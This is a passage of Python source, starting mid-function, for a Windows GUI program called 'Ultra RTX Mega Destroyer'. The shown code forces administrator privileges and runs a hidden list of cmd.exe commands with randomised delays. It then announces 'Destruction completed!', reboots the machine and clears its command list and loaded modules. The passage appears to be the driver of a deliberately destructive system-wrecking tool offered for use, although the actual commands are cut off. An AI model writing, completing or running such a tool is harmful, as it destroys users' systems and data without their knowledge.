                result = subprocess.run(['cmd.exe', '/c', cmd], capture_output=True, timeout=15, encoding='latin1')
                log_message(window, log_area, f"Command executed: {cmd}", operation="Command Execution")
                if result.stderr and "success" not in result.stderr.lower():
                    log_message(window, log_area, f"Error: {result.stderr} (WinError: {ctypes.get_last_error()})", success=False, operation="Command Execution")
            else:
                result = subprocess.run(['cmd.exe', '/c', cmd], capture_output=True, timeout=15, encoding='latin1')
                log_message(window, log_area, f"Command executed: {cmd}", operation="Command Execution")
                if result.stderr and "success" not in result.stderr.lower():
                    log_message(window, log_area, f"Error: {result.stderr} (WinError: {ctypes.get_last_error()})", success=False, operation="Command Execution")
            time.sleep(random.uniform(5.0, 15.0))
        except (subprocess.SubprocessError, OSError, ValueError) as e:
            log_message(window, log_area, f"Error: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Command Execution")
    
    status_label.config(text="Status: Destruction Completed! Rebooting...")
    window.update()
    log_message(window, log_area, "Destruction completed!", operation="Start")
    system_reboot(window, log_area)

# Create GUI
def create_gui():
    """Creates Tkinter GUI."""
    window = tk.Tk()
    window.title("Ultra RTX Mega Destroyer")
    window.geometry("600x400")
    window.resizable(False, False)
    
    # Start button
    start_button = tk.Button(window, text="Start", font=("Arial", 14, "bold"), bg="red", fg="white", command=lambda: start_destruction(window, log_area, status_label))
    start_button.pack(pady=10)
    
    # Status bar
    status_label = tk.Label(window, text="Status: Ready", font=("Arial", 12))
    status_label.pack(pady=5)
    
    # Log area
    log_area = scrolledtext.ScrolledText(window, height=15, width=70, font=("Arial", 10))
    log_area.pack(pady=10)
    
    # Admin check
    run_as_admin()
    if not is_admin():
        log_message(window, log_area, "Error: Must be run with administrator privileges!", success=False, operation="Start")
        window.after(2000, window.destroy)
        return
    
    window.mainloop()

if __name__ == '__main__':
    create_gui()
    # Cleanup
    del commands
    sys.modules.clear()
